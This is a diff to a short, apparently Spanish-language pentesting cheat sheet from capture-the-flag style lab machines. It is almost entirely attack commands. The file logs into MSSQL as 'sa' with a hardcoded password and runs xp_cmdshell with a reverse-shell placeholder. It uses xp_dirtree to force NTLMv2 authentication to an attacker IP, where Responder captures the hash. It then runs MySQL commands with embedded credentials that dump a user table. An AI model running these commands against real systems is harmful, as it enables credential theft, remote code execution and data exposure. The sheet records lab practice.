@@ -31,3 +31,26 @@ impacket-mssqlclient '10.10.11.51/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'
 ```bash
 SQL (sa  dbo@master)> xp_cmdshell REVSHELL
 ```
+
+## Sacar NTLM v2
+
+```sql
+EXEC xp_dirtree '\\10.10.14.5\share', 1, 1
+```
+
+- En local
+```bash
+responder -I tun0
+```
+
+
+## MYSQL con xamp
+
+- vas a C:/xampp/mysql/bin
+```sql
+.\mysql.exe -u 'MrGibbonsDB' -p'MisterGibbs!Parrot!?1' -e "show databases;"
+
+.\mysql.exe -u 'MrGibbonsDB' -p'MisterGibbs!Parrot!?1' -e "show tables;" gibbon
+
+.\mysql.exe -u 'MrGibbonsDB' -p'MisterGibbs!Parrot!?1' -e "USE gibbon; select * from gibbonperson;" -E
+```
